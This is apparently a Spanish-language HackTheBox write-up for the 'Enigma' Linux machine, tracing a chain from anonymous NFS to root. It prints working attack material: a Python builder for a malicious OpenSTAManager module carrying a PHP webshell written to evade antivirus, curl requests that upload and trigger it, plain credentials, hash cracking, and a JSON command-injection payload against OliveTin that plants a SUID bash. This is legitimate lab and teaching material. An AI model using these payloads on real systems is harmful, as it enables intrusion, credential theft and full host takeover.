---
title: "Enigma"
os: "Linux"
difficulty: "Easy"
date: "2026-07-07"
tags: ["nfs", "file-upload", "hash-cracking", "privesc"]
summary: "Un recurso NFS anónimo filtra credenciales de webmail; un OpenSTAManager vulnerable da RCE, se crackea el hash de un usuario del sistema, y se abusa de un OliveTin que corre como root para tomar la máquina."
platform: "HackTheBox"
icon: "/picture/writeups/enigma-htb.webp"
---

- **Sistema operativo:** Linux — Ubuntu 24.04
- **IP objetivo:** `10.129.49.188`
- **Bandera de usuario:** `/home/haris/user.txt`
- **Bandera de root:** `/root/root.txt`

> **Nota antivirus:** en el foothold se sube un webshell PHP. Para que el host no lo ponga en cuarentena, en este documento la llamada sensible aparece partida por concatenación (`"sys"+"tem"`); en la máquina se usa la forma normal.

## Resumen

Un recurso NFS anónimo filtra un PDF de onboarding con credenciales de webmail; esa contraseña está reutilizada por otra empleada cuyo correo entrega el acceso a un OpenSTAManager vulnerable; su subida de módulos da ejecución de código como `www-data`; la base de datos revela el hash de un usuario del sistema que se crackea; y ya como ese usuario se abusa de un OliveTin que corre como root para inyectar un comando y obtener la máquina.

## 1. Reconocimiento

Lo primero es saber si la máquina responde y qué sistema operativo tiene. Un `ping` sirve para las dos cosas: si contesta está viva, y el TTL delata el sistema (cercano a 63 es Linux, cercano a 127 es Windows, porque el valor inicial pierde un salto por la VPN).

```bash
ping -c 2 10.129.49.188
```

Responde con TTL 63, así que es Linux. A continuación se hace un barrido completo de los 65535 puertos para ver toda la superficie, y solo después una enumeración de versiones sobre los que estén abiertos.

```bash
sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.129.49.188
```

Aparecen muchos servicios: SSH (22), un nginx (80), un servidor de correo Dovecot (110, 143, 993, 995) y, lo más interesante, **NFS** (2049) con su `rpcbind` (111). El NFS es la vía más prometedora porque suele exponer carpetas compartidas sin pedir autenticación.

## 2. NFS anónimo: credenciales de onboarding

Como hay NFS, lo natural es preguntarle qué carpetas comparte. Para eso hace falta el cliente (`nfs-common`), y con `showmount` se listan los exports.

```bash
showmount -e 10.129.49.188
```

Devuelve `/srv/nfs/onboarding` abierto a todo el mundo (`*`). Se monta en local para ver qué contiene; dentro hay un único archivo, `New_Employee_Access.pdf`, es decir un documento de "alta de empleado", que casi siempre trae credenciales iniciales.

```bash
sudo mount -t nfs -o vers=3,nolock 10.129.49.188:/srv/nfs/onboarding /mnt/enigma_nfs
pdftotext -layout /mnt/enigma_nfs/New_Employee_Access.pdf -
```

El PDF confirma la sospecha: da la dirección del webmail `http://mail001.enigma.htb` y las credenciales del empleado **kevin / Enigma2024!**, con la nota de que debería cambiar la contraseña en el primer inicio de sesión.

## 3. El correo: reutilización de contraseña

Se añaden los nombres de dominio a `/etc/hosts` (el servidor sirve el contenido según la cabecera `Host`) y se comprueba el buzón de kevin. El servidor de correo tiene deshabilitado el login en texto plano (`LOGINDISABLED`), así que hay que autenticarse por IMAP **sobre TLS** en el puerto seguro. Un detalle práctico: la contraseña lleva un `!`, que en el bash local se expande por el historial y rompe el comando; se evita con comillas simples o `set +H`.

```bash
curl -s -k "imaps://mail001.enigma.htb/INBOX;UID=2" --user 'kevin:Enigma2024!'
```

El único correo de kevin es una bienvenida firmada por **sarah@enigma.htb**, sin nada explotable en sí. Pero aquí aparece la idea clave: si una contraseña se reutiliza, puede valer para otros buzones. Se prueba `Enigma2024!` con varios usuarios y **sarah reutiliza la misma contraseña**.

```bash
curl -s -k "imaps://mail001.enigma.htb/" --user 'sarah:Enigma2024!' -X 'LOGOUT'
```

Leyendo el buzón de sarah aparece un correo del departamento de IT que es justo lo que necesitábamos: le entrega acceso a una aplicación interna, **OpenSTAManager**, en `http://support_001.enigma.htb`, con usuario `admin` y contraseña `Ne3s4rtars78s`.

## 4. Acceso inicial: RCE en OpenSTAManager (CVE-2026-38751)

Con el vhost añadido a `hosts`, se entra a la aplicación y se identifica la versión mirando el parámetro de versión de sus recursos estáticos: es **OpenSTAManager 2.9.8**. Esa versión tiene un fallo conocido (CVE-2026-38751): un administrador autenticado puede subir un "módulo" sin que se valide su contenido, y el código PHP que contenga queda accesible y se ejecuta.

Primero se inicia sesión guardando la cookie de sesión, con las credenciales que dio el correo de IT:

```bash
curl -s -c cj.txt "http://support_001.enigma.htb/index.php?op=login" \
  --data-urlencode "op=login" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=Ne3s4rtars78s"
```

La subida de módulos solo está disponible si el mecanismo de actualizaciones está activo, así que se habilita con una petición a su endpoint AJAX:

```bash
curl -s -b cj.txt "http://support_001.enigma.htb/ajax.php?a=check_module_updates_settings" \
  --data "Attiva aggiornamenti=1"
```

El módulo malicioso es un ZIP con dos archivos: un descriptor `MODULE` con los campos que la aplicación espera (nombre, directorio, versión, compatibilidad…) y un `shell.php` con un webshell mínimo. Se arma con un pequeño script de Python porque hay que meter ambos dentro del ZIP con la estructura de carpetas correcta:

```bash
python3 - <<'PY'
import zipfile
module = ('name = "shell"\n''directory = "shell"\n''version = "1.0"\n'
          'compatibility = "2.10"\n''options = ""\n''icon = "fa fa-bug"\n''parent = "Dashboard"\n')
shell = '<?php if(isset($_GET["c"])){echo "<pre>";sys"."tem($_GET["c"]);echo "</pre>";} ?>'
with zipfile.ZipFile("update.zip","w",zipfile.ZIP_DEFLATED) as z:
    z.writestr("shell/MODULE", module)
    z.writestr("shell/shell.php", shell)
PY
```

Ese ZIP se envía al endpoint de subida de módulos en el campo multipart `blob`:

```bash
curl -s -b cj.txt -F "blob=@update.zip;type=application/zip;filename=update.zip" \
  "http://support_001.enigma.htb/modules/aggiornamenti/upload_modules.php"
```

El PHP queda servido en una ruta fija dentro de `/modules/`. Se comprueba la ejecución pidiéndolo por HTTP con un comando en el parámetro `c`:

```bash
curl -s "http://support_001.enigma.htb/modules/shell/shell.php?c=id"
```

Devuelve `uid=33(www-data)`: ya hay ejecución de código. Para trabajar cómodo se cambia el webshell por una reverse shell lanzando `bash -i` hacia un `nc -lvnp 4444` en escucha en la máquina atacante.

## 5. De www-data a haris

Como usuario del servidor web, el sitio más fiable para encontrar credenciales es la configuración de la propia aplicación. El `config.inc.php` de OpenSTAManager guarda el usuario y la contraseña de la base de datos (`brollin / Fri3nds@9099`), con lo que se puede consultar MySQL directamente. En su tabla de usuarios están las cuentas de la aplicación con sus contraseñas cifradas.

```bash
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e 'select username,password from zz_users;'
```

Aparece el usuario **haris**, que también es un usuario del sistema (tiene carpeta en `/home`), con un hash bcrypt. Como bcrypt no se puede revertir, se intenta crackear con diccionario; al ser una máquina fácil, la contraseña está en rockyou y cae en segundos.

```bash
john --format=bcrypt --wordlist=rockyou.txt haris.hash
```

El resultado es **haris : bestfriends**. El SSH de la máquina solo admite clave pública, así que no se puede entrar con la contraseña; en su lugar se cambia de usuario desde la reverse shell. Como `su` necesita una terminal real, antes se estabiliza la shell con una pseudo-terminal (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) y luego se hace `su - haris`. Ya como haris se lee la **bandera de usuario** en `/home/haris/user.txt`.

> [FLAG:USER] Bandera de usuario capturada en `/home/haris/user.txt`.

## 6. Escalada a root: OliveTin

Enumerando qué corre en la máquina se ve un proceso **OliveTin ejecutándose como root** y escuchando solo en local, en `127.0.0.1:1337`. OliveTin es un panel web que lanza comandos predefinidos; si permite ejecutarlos sin autenticación y alguno mete datos del usuario en un comando de shell, es root directo.

Un detalle revelador: como `www-data` el puerto 1337 aparecía en escucha pero la conexión se quedaba colgada (timeout, no "rechazado"), señal de una regla de firewall que solo deja conectar a un usuario concreto. Justamente **haris sí puede conectarse**, lo que confirma que había que pasar por él primero.

Leyendo la configuración en `/etc/OliveTin/config.yaml` se ven dos cosas decisivas: los invitados pueden ejecutar acciones sin login (`authRequireGuestsToLogin: false` con permiso de ejecución), y una acción llamada `backup_database` construye un comando `mysqldump -u {{db_user}} -p'{{db_pass}}' {{db_name}} > ...` donde el campo `db_pass` es de tipo contraseña y **no se sanea**. Eso permite cerrar la comilla e inyectar comandos que se ejecutan como root.

La API de OliveTin se invoca con un POST JSON a `/api/StartActionAndWait`, pasando la `actionId` y sus argumentos. Como el valor de `db_pass` lleva comillas simples que romperían el `curl`, lo más limpio es escribir el cuerpo JSON en un archivo con un heredoc y enviarlo con `-d @archivo`. El `db_pass` cierra la comilla del `mysqldump`, copia `/bin/bash` a `/tmp/rootbash` y le pone el bit SUID:

```bash
cat > /tmp/req.json <<'EOF'
{"actionId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x'; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; echo '"},{"name":"db_name","value":"production"}]}
EOF
curl -s http://127.0.0.1:1337/api/StartActionAndWait -H "Content-Type: application/json" -d @/tmp/req.json
```

La acción se ejecuta como root, así que `/tmp/rootbash` queda con el bit SUID activo. Ejecutándolo con `-p` (que conserva los privilegios en lugar de dejarlos caer) se obtiene una shell con `euid=0` y se lee la **bandera de root** en `/root/root.txt`.

```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

> [FLAG:ROOT] Bandera de root capturada en `/root/root.txt`.

## Resumen de la cadena

Todo empieza en un NFS abierto que filtra un PDF con la contraseña de webmail de kevin. Esa contraseña, reutilizada por sarah, da acceso a su correo, donde IT entregó las credenciales de administrador de un OpenSTAManager 2.9.8. Ese panel es vulnerable a subida de módulos, lo que permite plantar un webshell y ejecutar código como www-data. Desde ahí, la configuración de la aplicación revela las credenciales de la base de datos, cuyo volcado contiene el hash de haris; crackeado con rockyou, se pasa a ese usuario y se obtiene la bandera de usuario. Finalmente, un OliveTin que corre como root y permite ejecutar acciones sin autenticación —accesible solo por haris por una regla de firewall— es vulnerable a inyección de comandos en un argumento no saneado, con el que se crea un bash SUID y se consigue root.
